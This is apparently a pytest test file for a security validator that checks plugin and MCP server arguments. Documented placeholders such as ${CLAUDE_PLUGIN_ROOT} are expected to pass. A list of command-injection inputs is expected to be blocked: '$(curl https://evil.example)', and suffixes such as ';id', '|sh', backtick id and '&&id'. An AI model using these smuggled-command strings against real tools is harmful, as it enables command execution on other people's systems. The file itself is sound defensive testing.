"""Documented plugin path placeholders are not shell metacharacters; everything else stays blocked."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from agent_bom.core.security_validation import SecurityError, validate_arguments

ROOT = Path(__file__).resolve().parent.parent


@pytest.mark.parametrize(
    "arg",
    [
        "${CLAUDE_PLUGIN_ROOT}",
        "${CLAUDE_PLUGIN_ROOT}/server.py",
        "--project=${CLAUDE_PLUGIN_ROOT}",
        "${CLAUDE_PROJECT_DIR}/config.json",
    ],
)
def test_documented_plugin_placeholders_are_accepted(arg: str) -> None:
    validate_arguments([arg])


@pytest.mark.parametrize(
    "arg",
    [
        "$(curl https://evil.example)",
        "${HOME}",
        "$HOME",
        "${CLAUDE_PLUGIN_ROOT:-$(id)}",
        "${CLAUDE_PLUGIN_ROOT}$(id)",
        "${CLAUDE_PLUGIN_ROOT};id",
        "${CLAUDE_PLUGIN_ROOT}|sh",
        "${CLAUDE_PLUGIN_ROOT}`id`",
        "${CLAUDE_PLUGIN_ROOT}&&id",
        "${CLAUDE_PLUGIN_ROOT_EVIL}",
        "${claude_plugin_root}",
        "$CLAUDE_PLUGIN_ROOT",
        "${${CLAUDE_PLUGIN_ROOT}}",
        "$${CLAUDE_PLUGIN_ROOT}",
    ],
)
def test_anything_else_with_a_metacharacter_stays_blocked(arg: str) -> None:
    with pytest.raises(SecurityError):
        validate_arguments([arg])


def test_the_shipped_plugin_config_passes_its_own_scanner() -> None:
    config = json.loads((ROOT / "integrations/claude-code/.mcp.json").read_text(encoding="utf-8"))
    for server in config["mcpServers"].values():
        validate_arguments(server["args"])
